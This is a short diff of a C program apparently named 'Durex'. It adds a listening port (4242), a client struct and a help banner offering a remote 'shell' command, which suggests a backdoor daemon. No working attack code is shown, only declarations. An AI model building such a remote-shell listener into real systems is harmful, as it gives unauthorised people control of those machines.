@@ -13,15 +13,17 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 #include <sys/wait.h>
-
+#include <pwd.h>
 
 #define PORT       4242
 #define MAX 3
 
-typedef struct	s_child {
+#define HELP "Durex v1.0: Available command:\nhelp\nshell\nquit\n"
+
+typedef struct	s_client {
 	int pid;
 	int socket;
-}				t_child;
+}				t_client;
 
 int		main(int argc, char **argv);
 int		durex(int argc, char **argv);
